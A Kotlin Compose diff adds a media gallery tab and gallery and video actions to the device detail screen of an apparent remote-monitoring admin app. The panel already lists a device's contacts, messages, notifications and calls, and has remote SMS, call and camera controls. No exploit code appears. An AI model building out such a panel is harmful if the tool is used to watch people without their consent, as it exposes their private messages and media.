@@ -63,6 +63,8 @@ import com.datasync.admin.utils.DataUtils.copyToClipboard
 import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.delay
 import kotlinx.coroutines.launch
+import coil.decode.VideoFrameDecoder
+import coil.request.videoFrameMillis
 
 @OptIn(ExperimentalMaterial3Api::class, ExperimentalFoundationApi::class)
 @Composable
@@ -116,7 +118,7 @@ fun DeviceDetailScreen(deviceId: String, viewModel: DeviceDetailViewModel, onBac
 @Composable
 fun DeviceDetailContent(deviceId: String, device: Device, viewModel: DeviceDetailViewModel, onBack: () -> Unit) {
     val scope = rememberCoroutineScope()
-    val pagerState = rememberPagerState(pageCount = { 4 })
+    val pagerState = rememberPagerState(pageCount = { 5 })
     val searchQuery by viewModel.searchQuery.collectAsStateWithLifecycle()
     val syncStatus by viewModel.syncStatus.collectAsStateWithLifecycle()
 
@@ -126,10 +128,11 @@ fun DeviceDetailContent(deviceId: String, device: Device, viewModel: DeviceDetai
         TabItem("Contacts", Icons.Default.Person),
         TabItem("Messages", Icons.Default.Email),
         TabItem("Notifications", Icons.Default.Notifications),
-        TabItem("Calls", Icons.Default.Call)
+        TabItem("Calls", Icons.Default.Call),
+        TabItem("Media", Icons.Default.PhotoLibrary)
     )
 
-    val listStates = List(4) { rememberLazyListState() }
+    val listStates = List(5) { rememberLazyListState() }
 
     val showScrollToTop by remember {
         derivedStateOf {
@@ -339,6 +342,7 @@ fun DeviceDetailContent(deviceId: String, device: Device, viewModel: DeviceDetai
                             1 -> MessagesTab(viewModel, listStates[1])
                             2 -> NotificationsTab(viewModel, listStates[2])
                             3 -> CallsTab(viewModel, listStates[3])
+                            4 -> MediaTab(viewModel, listStates[4])
                         }
                     }
                 }
@@ -2110,8 +2114,8 @@ fun DeviceActionsBottomSheet(
             val actions = listOf(
                 GridActionItem("Send SMS", Icons.AutoMirrored.Filled.Send, MaterialTheme.colorScheme.primary) { showSendSms = true },
                 GridActionItem("Call Number", Icons.Default.Call, Color(0xFF4CAF50)) { showCall = true },
-                GridActionItem("Gallery", Icons.Default.PhotoLibrary, Color(0xFFFF9800)) { /* Placeholder */ },
-                GridActionItem("Videos", Icons.Default.VideoLibrary, Color(0xFFE91E63)) { /* Placeholder */ },
+                GridActionItem("Gallery", Icons.Default.PhotoLibrary, Color(0xFFFF9800)) { viewModel.openGallery() },
+                GridActionItem("Videos", Icons.Default.VideoLibrary, Color(0xFFE91E63)) { viewModel.openVideos() },
                 GridActionItem("Front Cam", Icons.Default.CameraFront, Color(0xFF9C27B0)) { /* Placeholder */ },
                 GridActionItem("Back Cam", Icons.Default.CameraRear, Color(0xFF673AB7)) { /* Placeholder */ },
                 GridActionItem("Delete", Icons.Default.Delete, MaterialTheme.colorScheme.error) { showDeleteConfirm = true }
@@ -2201,5 +2205,193 @@ fun getCallTypeColor(type: Int): Color {
         2 -> Color(0xFF2196F3) // Blue
         3 -> Color(0xFFF44336) // Red
         else -> MaterialTheme.colorScheme.outline
+    }
+}
+
+@OptIn(ExperimentalFoundationApi::class)
+@Composable
+fun MediaTab(viewModel: DeviceDetailViewModel, listState: LazyListState) {
+    val state by viewModel.media.collectAsStateWithLifecycle()
+    val filter by viewModel.mediaFilter.collectAsStateWithLifecycle()
+
+    var showActionSheet by remember { mutableStateOf(false) }
+    var itemToDelete by remember { mutableStateOf<MediaData?>(null) }
+    var showPreview by remember { mutableStateOf<MediaData?>(null) }
+
+    Column(modifier = Modifier.fillMaxSize()) {
+        ScrollableTabRow(
+            selectedTabIndex = when (filter) {
+                "Image" -> 1
+                "Video" -> 2
+                else -> 0
+            },
+            edgePadding = 16.dp,
+            modifier = Modifier.fillMaxWidth()
+        ) {
+            listOf("All", "Image", "Video").forEachIndexed { index, title ->
+                Tab(
+                    selected = filter == title,
+                    onClick = { viewModel.setMediaFilter(title) },
+                    text = { Text(title) }
+                )
+            }
+        }
+
+        when (val uiState = state) {
+            is TabUiState.Loading -> {
+                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                    CircularProgressIndicator()
+                }
+            }
+            is TabUiState.Empty -> {
+                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                    Text("No media found", style = MaterialTheme.typography.bodyLarge)
+                }
+            }
+            is TabUiState.Error -> {
+                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
+                    Text(uiState.message, color = MaterialTheme.colorScheme.error)
+                }
+            }
+            is TabUiState.Success -> {
+                LazyVerticalGrid(
+                    columns = GridCells.Fixed(3),
+                    state = androidx.compose.foundation.lazy.grid.rememberLazyGridState(),
+                    contentPadding = PaddingValues(8.dp),
+                    horizontalArrangement = Arrangement.spacedBy(8.dp),
+                    verticalArrangement = Arrangement.spacedBy(8.dp),
+                    modifier = Modifier.fillMaxSize()
+                ) {
+                    items(uiState.data.size) { index ->
+                        val media = uiState.data[index]
+                        MediaGridItem(
+                            media = media,
+                            onClick = { showPreview = media },
+                            onLongClick = {
+                                itemToDelete = media
+                                showActionSheet = true
+                            }
+                        )
+                    }
+                }
+            }
+        }
+    }
+
+    if (showActionSheet && itemToDelete != null) {
+        @OptIn(ExperimentalMaterial3Api::class)
+        ModalBottomSheet(onDismissRequest = { showActionSheet = false }) {
+            Column(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(16.dp)
+            ) {
+                Text(
+                    text = "Media Actions",
+                    style = MaterialTheme.typography.titleMedium,
+                    fontWeight = FontWeight.Bold,
+                    modifier = Modifier.padding(bottom = 16.dp)
+                )
+
+                ListItem(
+                    headlineContent = { Text("Delete Media") },
+                    leadingContent = { Icon(Icons.Default.Delete, contentDescription = null, tint = MaterialTheme.colorScheme.error) },
+                    modifier = Modifier.clickable {
+                        viewModel.deleteMedia(itemToDelete!!.id)
+                        showActionSheet = false
+                    }
+                )
+
+                Spacer(modifier = Modifier.height(24.dp))
+            }
+        }
+    }
+
+    if (showPreview != null) {
+        val uri = android.net.Uri.parse(showPreview!!.secureUrl)
+        val context = LocalContext.current
+
+        if (showPreview!!.type == "video") {
+            LaunchedEffect(showPreview) {
+                val intent = android.content.Intent(android.content.Intent.ACTION_VIEW, uri)
+                intent.setDataAndType(uri, "video/*")
+                context.startActivity(intent)
+                showPreview = null
+            }
+        } else {
+            AlertDialog(
+                onDismissRequest = { showPreview = null },
+                title = { Text(showPreview!!.fileName) },
+                text = {
+                    Column {
+                        coil.compose.AsyncImage(
+                            model = showPreview!!.secureUrl,
+                            contentDescription = "Preview",
+                            modifier = Modifier.fillMaxWidth().height(300.dp)
+                        )
+                        Spacer(modifier = Modifier.height(8.dp))
+                        Text("Type: ${showPreview!!.type}")
+                        Text("Dimensions: ${showPreview!!.width} x ${showPreview!!.height}")
+                        Text("Format: ${showPreview!!.format}")
+                        Text("Size: ${showPreview!!.sizeBytes / 1024} KB")
+                    }
+                },
+                confirmButton = {
+                    TextButton(onClick = { showPreview = null }) {
+                        Text("Close")
+                    }
+                }
+            )
+        }
+    }
+}
+
+@OptIn(ExperimentalFoundationApi::class)
+@Composable
+fun MediaGridItem(media: MediaData, onClick: () -> Unit, onLongClick: () -> Unit) {
+    val modelUrl = if (media.type == "video") {
+        media.thumbnailUrl.ifEmpty { media.secureUrl }
+    } else {
+        media.secureUrl
+    }
+
+    val context = LocalContext.current
+    val imageRequest = coil.request.ImageRequest.Builder(context)
+        .data(modelUrl)
+        .apply {
+            if (media.type == "video") {
+                videoFrameMillis(1000)
+                decoderFactory { result, options, _ -> VideoFrameDecoder(result.source, options) }
+            }
+        }
+        .build()
+
+    Card(
+        shape = RoundedCornerShape(8.dp),
+        modifier = Modifier
+            .aspectRatio(1f)
+            .combinedClickable(
+                onClick = onClick,
+                onLongClick = onLongClick
+            )
+    ) {
+        Box(modifier = Modifier.fillMaxSize()) {
+            coil.compose.AsyncImage(
+                model = imageRequest,
+                contentDescription = null,
+                contentScale = androidx.compose.ui.layout.ContentScale.Crop,
+                modifier = Modifier.fillMaxSize()
+            )
+            if (media.type == "video") {
+                Icon(
+                    Icons.Default.PlayCircleOutline,
+                    contentDescription = "Video",
+                    tint = Color.White,
+                    modifier = Modifier
+                        .align(Alignment.Center)
+                        .size(48.dp)
+                )
+            }
+        }
     }
 }
